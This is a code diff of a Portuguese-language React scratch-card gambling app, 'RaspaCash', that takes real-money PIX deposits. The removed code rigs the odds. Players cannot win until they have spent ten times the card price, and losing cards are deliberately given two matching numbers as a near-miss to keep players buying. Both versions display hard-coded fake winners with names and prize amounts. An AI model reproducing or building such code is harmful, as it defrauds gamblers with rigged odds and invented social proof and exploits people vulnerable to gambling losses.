@@ -1,50 +1,20 @@
-{
-import React, { useState, useRef, useEffect } from 'react';
+import React, { useState } from 'react';
 
-const SistemaRaspadinha = () => {
-  const canvasRef = useRef(null);
-  const [selectedPlan, setSelectedPlan] = useState(null);
-  const [isScratching, setIsScratching] = useState(false);
-  const [isRevealed, setIsRevealed] = useState(false);
-  const [prize, setPrize] = useState(0);
-  const [balance, setBalance] = useState(0);
-  const [scratchedArea, setScratchedArea] = useState(0);
+export default function RaspaCash() {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
-  const [showLogin, setShowLogin] = useState(false);
-  const [showDeposit, setShowDeposit] = useState(false);
-  const [showFeed, setShowFeed] = useState(false);
+  const [balance, setBalance] = useState(0);
+  const [selectedPlan, setSelectedPlan] = useState(null);
   const [user, setUser] = useState({ name: '', email: '' });
-  const [depositAmount, setDepositAmount] = useState('');
-  const [paymentMethod, setPaymentMethod] = useState('pix');
-  const [showPromotion, setShowPromotion] = useState(false);
+  const [showDeposit, setShowDeposit] = useState(false);
   const [showWithdraw, setShowWithdraw] = useState(false);
+  const [showFeed, setShowFeed] = useState(false);
+  const [depositAmount, setDepositAmount] = useState('');
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [withdrawData, setWithdrawData] = useState({
     fullName: '',
     pixKey: '',
     pixKeyType: 'cpf'
   });
-  
-  // Sistema de sequência de fidelidade por cartela
-  const [loyaltySequences, setLoyaltySequences] = useState({
-    1: { spent: 0, games: 0 }, // Plano Clássico R$ 5
-    2: { spent: 0, games: 0 }, // Plano Premium R$ 10  
-    3: { spent: 0, games: 0 }  // Plano VIP R$ 20
-  });
-  const [promoCards, setPromoCards] = useState([]);
-  const [scratchCard, setScratchCard] = useState(null);
-  const [revealedNumbers, setRevealedNumbers] = useState([]);
-  const [cellRevealStatus, setCellRevealStatus] = useState([]);
-  
-  // Estados para PIX e integrações
-  const [showPixModal, setShowPixModal] = useState(false);
-  const [currentPixPayment, setCurrentPixPayment] = useState(null);
-  const [pixCheckInterval, setPixCheckInterval] = useState(null);
-  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
-  
-  // APIs
-  const [picPayAPI, setPicPayAPI] = useState(null);
-  const [githubAPI, setGithubAPI] = useState(null);
 
   const plans = [
     {
@@ -52,19 +22,15 @@ const SistemaRaspadinha = () => {
       name: "Plano Clássico",
       cost: 5,
       maxPrize: 500,
-      returnRate: 0.03,
       color: "from-green-400 to-green-600",
-      image: "keys/classico?prompt=elegant%20golden%20scratch%20card%20design",
       description: "Diversão garantida com prêmios de até R$ 500!"
     },
     {
       id: 2,
-      name: "Plano Premium",
+      name: "Plano Premium", 
       cost: 10,
       maxPrize: 1000,
-      returnRate: 0.02,
       color: "from-purple-400 to-purple-600",
-      image: "keys/premium?prompt=luxury%20purple%20scratch%20card%20design%20with%20diamonds",
       description: "Experiência premium com prêmios de até R$ 1.000!"
     },
     {
@@ -72,1113 +38,330 @@ const SistemaRaspadinha = () => {
       name: "Plano VIP",
       cost: 20,
       maxPrize: 2000,
-      returnRate: 0.015,
       color: "from-red-400 to-red-600",
-      image: "keys/vip?prompt=exclusive%20red%20gold%20vip%20scratch%20card%20design",
       description: "Exclusividade VIP com prêmios de até R$ 2.000!"
     }
   ];
 
-  // Pacotes promocionais
-  const promotionalPacks = [
-    {
-      id: 'promo-1',
-      planId: 1,
-      name: "Pacote Clássico",
-      quantity: 5,
-      originalPrice: 25,
-      promoPrice: 15,
-      discount: 40,
-      color: "from-green-400 to-green-600",
-      image: "keys/promo-classico?prompt=pack%20of%205%20green%20scratch%20cards"
-    },
-    {
-      id: 'promo-2',
-      planId: 2,
-      name: "Pacote Premium",
-      quantity: 5,
-      originalPrice: 50,
-      promoPrice: 40,
-      discount: 20,
-      color: "from-purple-400 to-purple-600",
-      image: "keys/promo-premium?prompt=pack%20of%205%20purple%20premium%20scratch%20cards"
-    },
-    {
-      id: 'promo-3',
-      planId: 3,
-      name: "Pacote VIP",
-      quantity: 5,
-      originalPrice: 100,
-      promoPrice: 85,
-      discount: 15,
-      color: "from-red-400 to-red-600",
-      image: "keys/promo-vip?prompt=pack%20of%205%20red%20vip%20scratch%20cards"
-    }
+  const fakeWins = [
+    { name: "Maria Silva", prize: 750, plan: "Premium", time: "2 min atrás" },
+    { name: "João Santos", prize: 1200, plan: "VIP", time: "5 min atrás" },
+    { name: "Ana Costa", prize: 450, plan: "Clássico", time: "8 min atrás" },
+    { name: "Pedro Lima", prize: 850, plan: "Premium", time: "12 min atrás" },
+    { name: "Carla Souza", prize: 1800, plan: "VIP", time: "15 min atrás" }
   ];
 
-  // Feed de ganhos falsos
-  const fakeFeed = [
-    { name: "João S.", amount: 150, plan: "Clássico", time: "2 min atrás" },
-    { name: "Maria L.", amount: 890, plan: "Premium", time: "5 min atrás" },
-    { name: "Carlos P.", amount: 45, plan: "Clássico", time: "8 min atrás" },
-    { name: "Ana R.", amount: 1200, plan: "VIP", time: "12 min atrás" },
-    { name: "Pedro M.", amount: 320, plan: "Premium", time: "15 min atrás" },
-    { name: "Julia F.", amount: 75, plan: "Clássico", time: "18 min atrás" },
-    { name: "Roberto K.", amount: 1890, plan: "VIP", time: "22 min atrás" },
-    { name: "Fernanda O.", amount: 450, plan: "Premium", time: "25 min atrás" }
-  ];
+  const handleLogin = (name, email) => {
+    setUser({ name, email });
+    setIsLoggedIn(true);
+  };
 
-  // Calcular bônus de fidelidade para o plano específico
-  const calculateLoyaltyBonus = (planId) => {
-    const sequence = loyaltySequences[planId];
+  const buyCard = (planId) => {
     const plan = plans.find(p => p.id === planId);
     
-    if (!sequence || !plan) return 0;
-    
-    // Meta de gasto para ativar bônus de fidelidade (10x o custo da cartela)
-    const spendTarget = plan.cost * 10;
-    
-    if (sequence.spent >= spendTarget) {
-      // Calcular bônus progressivo: 2% a cada 10 jogadas extras após atingir a meta
-      const extraSpent = sequence.spent - spendTarget;
-      const extraCycles = Math.floor(extraSpent / spendTarget);
-      const bonusRate = Math.min(extraCycles * 0.02, 0.15); // Máximo 15% de bônus
-      
-      return bonusRate;
-    }
-    
-    return 0;
-  };
-
-  // Função para gerar cartela com números aleatórios + sistema de fidelidade
-  const generateScratchCard = (plan) => {
-    const numbers = [];
-    const maxNumber = plan.maxPrize;
-    
-    // Verificar se atingiu o valor mínimo para poder ganhar
-    const sequence = loyaltySequences[plan.id];
-    const spendTarget = plan.cost * 10; // Meta mínima para poder ganhar
-    const hasReachedMinimum = sequence.spent >= spendTarget;
-    
-    // Taxa base + bônus de fidelidade
-    const loyaltyBonus = calculateLoyaltyBonus(plan.id);
-    const finalReturnRate = plan.returnRate + loyaltyBonus;
-    
-    // Decidir se vai ganhar baseado na taxa de retorno + bônus
-    const random = Math.random();
-    
-    // SÓ PODE GANHAR SE ATINGIU O VALOR MÍNIMO
-    if (hasReachedMinimum && random < finalReturnRate) {
-      // VAI GANHAR - gerar cartela ganhadora
-      let prizeNumber;
-      if (random < 0.001) { // 0.1% chance de prêmio máximo (extremamente raro)
-        prizeNumber = plan.maxPrize;
-      } else if (random < 0.003) { // 0.2% chance de prêmio grande
-        prizeNumber = Math.floor(Math.random() * (plan.maxPrize * 0.2)) + (plan.maxPrize * 0.1);
-      } else { // chance de prêmio pequeno (mais comum) - menor ainda
-        prizeNumber = Math.floor(Math.random() * (plan.cost * 3)) + plan.cost;
-      }
-      
-      // Começar com números aleatórios
-      for (let i = 0; i < 9; i++) {
-        numbers.push(Math.floor(Math.random() * maxNumber) + 1);
-      }
-      
-      // Escolher 3 posições aleatórias para colocar o número premiado
-      const positions = [];
-      while (positions.length < 3) {
-        const pos = Math.floor(Math.random() * 9);
-        if (!positions.includes(pos)) {
-          positions.push(pos);
-        }
-      }
-      
-      positions.forEach(pos => {
-        numbers[pos] = prizeNumber;
-      });
-      
-      return { 
-        numbers, 
-        prizeNumber, 
-        isWinner: true, 
-        loyaltyBonus: loyaltyBonus,
-        finalReturnRate: finalReturnRate,
-        hasReachedMinimum: hasReachedMinimum
-      };
-    } else {
-      // NÃO VAI GANHAR - mas sempre garantir 2 números iguais para dar esperança
-      
-      // Gerar números base aleatórios
-      for (let i = 0; i < 9; i++) {
-        numbers.push(Math.floor(Math.random() * maxNumber) + 1);
-      }
-      
-      // Escolher um número "quase ganhador" (não pode ser muito alto para não frustar)
-      const almostWinNumber = Math.floor(Math.random() * (plan.cost * 8)) + plan.cost;
-      
-      // Escolher 2 posições aleatórias para colocar o número "quase ganhador"
-      const positions = [];
-      while (positions.length < 2) {
-        const pos = Math.floor(Math.random() * 9);
-        if (!positions.includes(pos)) {
-          positions.push(pos);
-        }
-      }
-      
-      // Colocar exatamente 2 números iguais
-      positions.forEach(pos => {
-        numbers[pos] = almostWinNumber;
-      });
-      
-      // Garantir que os outros números não formem trio
-      const numberCounts = {};
-      numbers.forEach(num => {
-        numberCounts[num] = (numberCounts[num] || 0) + 1;
-      });
-      
-      // Corrigir se algum outro número apareceu 3+ vezes
-      Object.keys(numberCounts).forEach(num => {
-        if (numberCounts[num] >= 3 && parseInt(num) !== almostWinNumber) {
-          const indices = numbers.map((n, i) => n == num ? i : -1).filter(i => i !== -1);
-          // Substituir os números extras para não formar trio
-          for (let i = 2; i < indices.length; i++) {
-            let newNumber;
-            do {
-              newNumber = Math.floor(Math.random() * maxNumber) + 1;
-            } while (newNumber === almostWinNumber || newNumber === parseInt(num));
-            numbers[indices[i]] = newNumber;
-          }
-        }
-      });
-      
-      return { 
-        numbers, 
-        prizeNumber: 0, 
-        isWinner: false, 
-        almostWinNumber,
-        loyaltyBonus: loyaltyBonus,
-        finalReturnRate: finalReturnRate,
-        hasReachedMinimum: hasReachedMinimum
-      };
-    }
-  };
-
-  // Função para verificar se ganhou
-  const checkWin = (numbers) => {
-    const counts = {};
-    numbers.forEach(num => {
-      counts[num] = (counts[num] || 0) + 1;
-    });
-    
-    const winningNumber = Object.keys(counts).find(num => counts[num] >= 3);
-    return winningNumber ? parseInt(winningNumber) : 0;
-  };
-
-  // Inicializar APIs ao carregar
-  useEffect(() => {
-    // Carregar scripts das APIs
-    const loadScripts = async () => {
-      try {
-        // Carregar QRCode library
-        if (!window.QRCode) {
-          const script = document.createElement('script');
-          script.src = 'https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js';
-          script.onload = () => console.log('QRCode library loaded');
-          document.head.appendChild(script);
-        }
-        
-        // Carregar APIs PicPay e GitHub se disponíveis
-        if (typeof window !== 'undefined') {
-          // Tentar carregar PicPay API
-          if (window.createPicPayAPI) {
-            const api = window.createPicPayAPI();
-            setPicPayAPI(api);
-            console.log('✅ PicPay API carregada');
-          } else {
-            console.warn('⚠️ PicPay API não encontrada');
-          }
-          
-          // Tentar carregar GitHub API
-          if (window.createGitHubAPI) {
-            const api = window.createGitHubAPI();
-            setGithubAPI(api);
-            console.log('✅ GitHub API carregada');
-          } else {
-            console.warn('⚠️ GitHub API não encontrada');
-          }
-        }
-      } catch (error) {
-        console.error('Erro ao carregar APIs:', error);
-      }
-    };
-    
-    loadScripts();
-  }, []);
-
-  // Funções de login e depósito - SEM LOGIN DE TESTE
-  const handleLogin = async (e) => {
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    const userData = {
-      name: formData.get('name')?.trim(),
-      email: formData.get('email')?.trim()
-    };
-    
-    // Validações
-    if (!userData.name || userData.name.length < 2) {
-      alert('Por favor, digite seu nome completo (mínimo 2 caracteres)');
-      return;
-    }
-    
-    if (!userData.email || !userData.email.includes('@')) {
-      alert('Por favor, digite um email válido');
-      return;
-    }
-    
-    setUser(userData);
-    
-    try {
-      // Carregar dados do usuário do GitHub
-      if (githubAPI) {
-        const userDataFromGitHub = await githubAPI.loadUserData(userData.email);
-        setBalance(userDataFromGitHub.balance || 0);
-        console.log('✅ Dados do usuário carregados do GitHub');
-      } else {
-        // Fallback para localStorage se GitHub não estiver disponível
-        const localData = localStorage.getItem(`user_${userData.email}`);
-        if (localData) {
-          const parsed = JSON.parse(localData);
-          setBalance(parsed.balance || 0);
-        } else {
-          setBalance(0);
-        }
-        console.warn('⚠️ GitHub API não disponível, usando localStorage');
-      }
-    } catch (error) {
-      console.error('Erro ao carregar dados do usuário:', error);
-      setBalance(0);
-    }
-    
-    setIsLoggedIn(true);
-    setShowLogin(false);
-  };
-
-  // Integração real com saque PIX via PicPay
-  const handleWithdraw = async (e) => {
-    e.preventDefault();
-    const amount = parseFloat(withdrawAmount);
-    
-    if (amount < 100) {
-      alert('Saque mínimo de R$ 100,00!');
-      return;
-    }
-    
-    if (amount > balance) {
-      alert('Saldo insuficiente para saque!');
-      return;
-    }
-
-    if (!withdrawData.fullName.trim()) {
-      alert('Por favor, preencha seu nome completo!');
-      return;
-    }
-
-    if (!withdrawData.pixKey.trim()) {
-      alert('Por favor, preencha sua chave PIX!');
-      return;
-    }
-    
-    if (!picPayAPI) {
-      alert('Sistema de saque não disponível. Tente novamente.');
-      return;
-    }
-    
-    try {
-      setIsProcessingPayment(true);
-      
-      // Processar saque via PicPay
-      const result = await picPayAPI.processPixPayout(
-        amount,
-        withdrawData.pixKey,
-        withdrawData.pixKeyType,
-        withdrawData.fullName,
-        user.email
-      );
-      
-      if (result.success) {
-        // Deduzir do saldo
-        setBalance(prev => prev - amount);
-        
-        // Registrar no GitHub
-        if (githubAPI) {
-          await githubAPI.logTransaction({
-            type: 'withdrawal',
-            amount: amount,
-            userId: user.email,
-            method: 'picpay_pix',
-            pixKey: withdrawData.pixKey,
-            status: 'processing'
-          });
-          
-          // Disparar webhook
-          await githubAPI.triggerWebhook('pix_payout_requested', {
-            user_id: user.email,
-            amount: amount,
-            pix_key: withdrawData.pixKey,
-            pix_key_type: withdrawData.pixKeyType,
-            full_name: withdrawData.fullName
-          });
-        }
-        
-        setWithdrawAmount('');
-        setWithdrawData({ fullName: '', pixKey: '', pixKeyType: 'cpf' });
-        setShowWithdraw(false);
-        
-        alert(`Saque de R$ ${amount.toFixed(2)} solicitado com sucesso! ${result.message}`);
-      } else {
-        throw new Error('Falha ao processar saque');
-      }
-      
-    } catch (error) {
-      console.error('Erro ao processar saque:', error);
-      alert('Erro ao processar saque: ' + error.message);
-    } finally {
-      setIsProcessingPayment(false);
-    }
-  };
-
-  // Integração real com PicPay PIX
-  const handleDeposit = async (e) => {
-    e.preventDefault();
-    const amount = parseFloat(depositAmount);
-    
-    if (!amount || amount < 5) {
-      alert('Valor mínimo para depósito: R$ 5,00');
-      return;
-    }
-    
-    if (!picPayAPI) {
-      alert('Sistema de pagamento não disponível. Tente novamente.');
-      return;
-    }
-    
-    try {
-      setIsProcessingPayment(true);
-      
-      // Gerar PIX via PicPay
-      const pixData = await picPayAPI.generatePixPayment(amount, user.email, user.email);
-      
-      setCurrentPixPayment(pixData);
-      setShowPixModal(true);
-      setShowDeposit(false);
-      
-      // Iniciar verificação de pagamento
-      startPaymentCheck(pixData.id);
-      
-    } catch (error) {
-      console.error('Erro ao gerar PIX:', error);
-      alert('Erro ao gerar PIX: ' + error.message);
-    } finally {
-      setIsProcessingPayment(false);
-    }
-  };
-
-  // Verificar status do pagamento PIX
-  const startPaymentCheck = (paymentId) => {
-    const interval = setInterval(async () => {
-      try {
-        if (!picPayAPI) return;
-        
-        const status = await picPayAPI.checkPaymentStatus(paymentId);
-        
-        if (status.status === 'paid' || status.status === 'completed') {
-          // Pagamento confirmado
-          const amount = currentPixPayment.amount;
-          setBalance(prev => prev + amount);
-          
-          // Registrar no GitHub
-          if (githubAPI) {
-            await githubAPI.logTransaction({
-              type: 'deposit',
-              amount: amount,
-              userId: user.email,
-              method: 'picpay_pix',
-              status: 'completed'
-            });
-            
-            // Disparar webhook
-            await githubAPI.triggerWebhook('pix_payment_confirmed', {
-              user_id: user.email,
-              amount: amount,
-              status: status.status,
-              transaction_id: status.authorizationId,
-              reference_id: paymentId
-            });
-          }
-          
-          clearInterval(interval);
-          setPixCheckInterval(null);
-          setShowPixModal(false);
-          
-          alert(`Pagamento confirmado! R$ ${amount.toFixed(2)} foi adicionado ao seu saldo.`);
-          
-        } else if (status.status === 'expired' || status.status === 'cancelled') {
-          clearInterval(interval);
-          setPixCheckInterval(null);
-          setShowPixModal(false);
-          alert('Pagamento expirado ou cancelado.');
-        }
-        
-      } catch (error) {
-        console.error('Erro ao verificar pagamento:', error);
-      }
-    }, 5000); // Verificar a cada 5 segundos
-    
-    setPixCheckInterval(interval);
-    
-    // Limpar após 30 minutos
-    setTimeout(() => {
-      if (interval) {
-        clearInterval(interval);
-        setPixCheckInterval(null);
-      }
-    }, 30 * 60 * 1000);
-  };
-
-  // Sistema de CAMADAS - números sempre visíveis por baixo do canvas
-  useEffect(() => {
-    if (selectedPlan && scratchCard && canvasRef.current) {
-      const canvas = canvasRef.current;
-      const ctx = canvas.getContext('2d');
-      
-      // Limpar canvas
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      
-      // Canvas TRANSPARENTE inicialmente (números ficam visíveis por baixo)
-      ctx.fillStyle = 'rgba(0, 0, 0, 0)';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      
-      // Cobrir tudo com cobertura cinza após um delay
-      setTimeout(() => {
-        // Cobertura opaca por cima dos números
-        ctx.fillStyle = '#666666';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
-        // Textura da cobertura
-        ctx.fillStyle = '#777777';
-        for (let i = 0; i < canvas.width; i += 15) {
-          for (let j = 0; j < canvas.height; j += 15) {
-            if ((i + j) % 30 === 0) {
-              ctx.fillRect(i, j, 8, 8);
-            }
-          }
-        }
-        
-        // Texto da cobertura
-        ctx.fillStyle = '#FFFFFF';
-        ctx.font = 'bold 16px Arial';
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'middle';
-        ctx.shadowColor = '#000000';
-        ctx.shadowBlur = 3;
-        
-        ctx.fillText('RASPE PARA REVELAR', canvas.width / 2, canvas.height / 2 - 20);
-        ctx.font = 'bold 14px Arial';
-        ctx.fillText('3 números iguais = GANHOU!', canvas.width / 2, canvas.height / 2);
-        ctx.font = 'bold 12px Arial';
-        ctx.fillText('(Clique e arraste)', canvas.width / 2, canvas.height / 2 + 20);
-        
-        ctx.shadowBlur = 0;
-      }, 100);
-      
-      // Reset dos estados
-      setScratchedArea(0);
-      setIsRevealed(false);
-      setRevealedNumbers([]);
-      setCellRevealStatus(new Array(9).fill(false));
-    }
-  }, [selectedPlan, scratchCard]);
-
-  // Função de raspar com sistema de camadas
-  const scratch = (e) => {
-    if (!canvasRef.current || !isScratching || !scratchCard) return;
-    
-    const canvas = canvasRef.current;
-    const ctx = canvas.getContext('2d');
-    const rect = canvas.getBoundingClientRect();
-    
-    const x = e.clientX - rect.left;
-    const y = e.clientY - rect.top;
-    
-    // APENAS remover cobertura para revelar números que estão por baixo
-    ctx.globalCompositeOperation = 'destination-out';
-    ctx.beginPath();
-    ctx.arc(x, y, 25, 0, 2 * Math.PI);
-    ctx.fill();
-    ctx.globalCompositeOperation = 'source-over';
-    
-    // Calcular área total raspada (contar pixels transparentes)
-    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-    let transparent = 0;
-    let totalPixels = 0;
-    
-    for (let i = 3; i < imageData.data.length; i += 4) {
-      totalPixels++;
-      if (imageData.data[i] < 100) {
-        transparent++;
-      }
-    }
-    
-    const scratchPercent = transparent / totalPixels;
-    setScratchedArea(scratchPercent);
-    
-    // Quando raspar 70% ou mais, revelar resultado final (mais responsivo)
-    if (scratchPercent >= 0.7 && !isRevealed) {
-      setIsRevealed(true);
-      
-      // Verificar se ganhou com base nos números da cartela
-      if (scratchCard) {
-        const winningAmount = checkWin(scratchCard.numbers);
-        setPrize(winningAmount);
-      }
-    }
-  };
-
-  const startGame = async (plan) => {
     if (balance < plan.cost) {
-      alert('Saldo insuficiente!');
+      alert('Saldo insuficiente! Faça um depósito.');
+      setShowDeposit(true);
       return;
     }
-    
-    // Atualizar sequência de fidelidade para este plano específico
-    setLoyaltySequences(prev => ({
-      ...prev,
-      [plan.id]: {
-        spent: prev[plan.id].spent + plan.cost,
-        games: prev[plan.id].games + 1
-      }
-    }));
     
     setBalance(prev => prev - plan.cost);
-    setSelectedPlan(plan);
-    const cardData = generateScratchCard(plan);
-    setScratchCard(cardData);
-    setPrize(cardData.prizeNumber);
-    setIsRevealed(false);
-    setRevealedNumbers([]);
-    setCellRevealStatus(new Array(9).fill(false));
+    setSelectedPlan(planId);
     
-    // Registrar jogo no GitHub
-    if (githubAPI) {
-      try {
-        await githubAPI.logGame({
-          userId: user.email,
-          cost: plan.cost,
-          planName: plan.name,
-          won: cardData.isWinner,
-          prize: cardData.prizeNumber || 0
-        });
-        
-        // Disparar webhook
-        await githubAPI.triggerWebhook('game_played', {
-          user_id: user.email,
-          cost: plan.cost,
-          won: cardData.isWinner,
-          prize: cardData.prizeNumber || 0
-        });
-      } catch (error) {
-        console.error('Erro ao registrar jogo:', error);
-      }
-    }
-  };
-
-  // Comprar pacote promocional
-  const buyPromotionalPack = (pack) => {
-    if (balance < pack.promoPrice) {
-      alert('Saldo insuficiente!');
-      return;
-    }
-
-    const originalPlan = plans.find(p => p.id === pack.planId);
-    if (!originalPlan) return;
-
-    // Descontar o valor do pacote do saldo
-    setBalance(prev => prev - pack.promoPrice);
-    
-    // Fechar modal de promoção
-    setShowPromotion(false);
-    
-    // Criar array com as cartelas do pacote
-    const cards = [];
-    for (let i = 0; i < pack.quantity; i++) {
-      const cardData = generateScratchCard(originalPlan);
-      cards.push({
-        id: i,
-        plan: originalPlan,
-        cardData: cardData,
-        isUsed: false
-      });
-    }
-    
-    // Configurar as cartelas promocionais
-    setPromoCards(cards);
-    setSelectedPlan({
-      ...originalPlan,
-      name: `${pack.name} - Promo`,
-      isPromo: true,
-      originalCost: originalPlan.cost,
-      promoCost: pack.promoPrice,
-      quantity: pack.quantity,
-      remainingGames: pack.quantity,
-      currentCard: null // Garantir que inicia na tela de seleção
-    });
-    
-    // Resetar estados da raspadinha
-    setPrize(0);
-    setIsRevealed(false);
-  };
-
-  // Selecionar cartela para raspar
-  const selectPromoCard = (cardIndex) => {
-    const card = promoCards[cardIndex];
-    if (card && !card.isUsed) {
-      setSelectedPlan(prev => ({
-        ...prev,
-        currentCard: cardIndex
-        // Não diminuir remainingGames aqui, apenas quando finalizar a cartela
-      }));
-      setScratchCard(card.cardData);
-      setPrize(card.cardData.prizeNumber);
-      setIsRevealed(false);
-      setRevealedNumbers([]);
-    }
-  };
-
-  // Finalizar cartela atual e voltar para seleção
-  const finishCurrentCard = () => {
-    // Marcar cartela como usada
-    setPromoCards(prev => 
-      prev.map((card, index) => 
-        index === selectedPlan.currentCard 
-          ? { ...card, isUsed: true }
-          : card
-      )
-    );
-
-    // Diminuir o número de cartelas restantes
-    const newRemainingGames = selectedPlan.remainingGames - 1;
-    
-    // Se ainda há cartelas, voltar para seleção
-    if (newRemainingGames > 0) {
-      setSelectedPlan(prev => ({ 
-        ...prev, 
-        currentCard: null,
-        remainingGames: newRemainingGames
-      }));
-      setPrize(0);
-      setIsRevealed(false);
-      setScratchCard(null);
-      setRevealedNumbers([]);
-      setCellRevealStatus([]);
+    // Simular jogo - 10% de chance de ganhar
+    const won = Math.random() < 0.1;
+    if (won) {
+      const prize = Math.floor(Math.random() * (plan.maxPrize - plan.cost * 2)) + plan.cost * 2;
+      setBalance(prev => prev + prize);
+      alert(`🎉 PARABÉNS! Você ganhou R$ ${prize}!`);
     } else {
-      // Acabaram as cartelas, voltar ao menu
-      setSelectedPlan(null);
-      setPromoCards([]);
-      setPrize(0);
-      setIsRevealed(false);
-      setScratchCard(null);
-      setRevealedNumbers([]);
+      alert('😔 Que pena! Não foi desta vez. Continue jogando!');
     }
   };
 
-  const collectPrize = async () => {
-    setBalance(prev => prev + prize);
-    
-    // Registrar prêmio no GitHub e localStorage
-    if (prize > 0) {
-      const transactionData = {
-        type: 'prize',
-        amount: prize,
-        userId: user.email,
-        method: 'scratch_card',
-        status: 'completed',
-        timestamp: new Date().toISOString()
-      };
-      
-      // Tentar salvar no GitHub
-      if (githubAPI) {
-        try {
-          await githubAPI.logTransaction(transactionData);
-        } catch (error) {
-          console.error('Erro ao registrar prêmio no GitHub:', error);
-        }
-      }
-      
-      // Sempre salvar no localStorage como backup
-      try {
-        const userKey = `user_${user.email}`;
-        const userData = JSON.parse(localStorage.getItem(userKey) || '{}');
-        userData.balance = balance + prize;
-        userData.lastUpdated = new Date().toISOString();
-        localStorage.setItem(userKey, JSON.stringify(userData));
-      } catch (error) {
-        console.error('Erro ao salvar no localStorage:', error);
-      }
-    }
-    
-    // Se é um pacote promocional, continuar com as outras cartelas
-    if (selectedPlan?.isPromo && promoCards.length > 0) {
-      finishCurrentCard();
-    } else {
-      // Jogo individual normal
-      setSelectedPlan(null);
-      setPrize(0);
-      setIsRevealed(false);
-      setScratchCard(null);
-      setRevealedNumbers([]);
-    }
-  };
-
-  // Modal PIX para pagamento
-  if (showPixModal && currentPixPayment) {
-    return (
-      <div className="w-full h-full bg-gradient-to-br from-blue-600 via-indigo-600 to-purple-600 p-4 text-white flex items-center justify-center relative overflow-hidden">
-        {/* Efeitos de fundo */}
-        <div className="absolute inset-0 opacity-30">
-          <div className="absolute top-20 left-20 w-40 h-40 bg-green-400 rounded-full blur-2xl animate-pulse"></div>
-          <div className="absolute bottom-20 right-20 w-32 h-32 bg-blue-400 rounded-full blur-2xl animate-bounce"></div>
-        </div>
-        
-        <div className="bg-white rounded-2xl p-8 max-w-md w-full mx-4 text-gray-800 relative z-10 shadow-2xl">
-          <div className="text-center mb-6">
-            <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-600 rounded-full mx-auto mb-4 flex items-center justify-center">
-              <span className="text-3xl">📱</span>
-            </div>
-            <h3 className="text-2xl font-bold text-gray-800 mb-2">Pagamento PIX</h3>
-            <p className="text-gray-600">Escaneie o QR Code ou use o código PIX</p>
-          </div>
-          
-          <div className="text-center mb-6">
-            <div id="qrCodeContainer" className="bg-gray-100 p-4 rounded-lg mb-4 flex justify-center">
-              <canvas id="qrCanvas" className="max-w-full"></canvas>
-            </div>
-            <div className="text-2xl font-bold text-green-600 mb-2">
-              R$ {currentPixPayment.amount.toFixed(2).replace('.', ',')}
-            </div>
-            <div className="text-sm text-gray-500 flex items-center justify-center">
-              <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse mr-2"></div>
-              Aguardando pagamento...
-            </div>
-          </div>
-          
-          <div className="space-y-3">
-            <button 
-              onClick={() => {
-                if (currentPixPayment?.qr_code) {
-                  navigator.clipboard.writeText(currentPixPayment.qr_code);
-                  alert('Código PIX copiado!');
-                }
-              }}
-              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition-all"
-            >
-              📋 Copiar Código PIX
-            </button>
-            <button 
-              onClick={() => {
-                setShowPixModal(false);
-                if (pixCheckInterval) {
-                  clearInterval(pixCheckInterval);
-                  setPixCheckInterval(null);
-                }
-              }}
-              className="w-full bg-gray-500 hover:bg-gray-600 text-white font-bold py-3 rounded-lg transition-all"
-            >
-              Cancelar
-            </button>
-          </div>
-          
-          <div className="mt-4 text-center text-xs text-gray-400">
-            <p>⏰ Este PIX expira em 30 minutos</p>
-            <p>💡 O pagamento será confirmado automaticamente</p>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  // Gerar QR Code quando o modal PIX é mostrado
-  useEffect(() => {
-    if (showPixModal && currentPixPayment && currentPixPayment.qr_code) {
-      const canvas = document.getElementById('qrCanvas');
-      if (canvas && window.QRCode) {
-        window.QRCode.toCanvas(canvas, currentPixPayment.qr_code, { 
-          width: 200,
-          margin: 2,
-          color: {
-            dark: '#000000',
-            light: '#FFFFFF'
-          }
-        }, function (error) {
-          if (error) console.error('Erro ao gerar QR Code:', error);
-        });
-      }
-    }
-  }, [showPixModal, currentPixPayment]);
-
-  // Tela de login
   if (!isLoggedIn) {
     return (
-      <div className="w-full h-full bg-gradient-to-br from-pink-500 via-red-500 to-yellow-500 p-8 text-white flex items-center justify-center relative overflow-hidden">
-        {/* Efeitos de fundo animados */}
-        <div className="absolute inset-0 opacity-20">
-          <div className="absolute top-10 left-10 w-32 h-32 bg-yellow-400 rounded-full blur-xl animate-pulse"></div>
-          <div className="absolute top-40 right-20 w-24 h-24 bg-pink-400 rounded-full blur-xl animate-bounce"></div>
-          <div className="absolute bottom-20 left-1/3 w-40 h-40 bg-purple-400 rounded-full blur-xl animate-pulse"></div>
-          <div className="absolute bottom-10 right-10 w-28 h-28 bg-green-400 rounded-full blur-xl animate-bounce"></div>
-        </div>
-        <div className="bg-gradient-to-br from-purple-800/80 to-blue-800/80 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full border border-yellow-400/30 shadow-2xl relative z-10">
+      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-blue-900 text-white flex items-center justify-center p-4">
+        <div className="bg-gradient-to-br from-purple-900/90 via-blue-900/90 to-cyan-900/90 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full border border-cyan-400/30 shadow-2xl">
           <div className="text-center mb-8">
-            <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
-              🎰 RaspaCash 🎰
+            <h1 className="text-4xl font-bold bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent mb-2">
+              RaspaCash
             </h1>
-            <p className="text-lg text-yellow-200">Faça login para começar a ganhar!</p>
-            <div className="flex justify-center space-x-2 mt-2">
-              <span className="text-2xl animate-bounce">💰</span>
-              <span className="text-2xl animate-pulse">🎉</span>
-              <span className="text-2xl animate-bounce">💎</span>
-            </div>
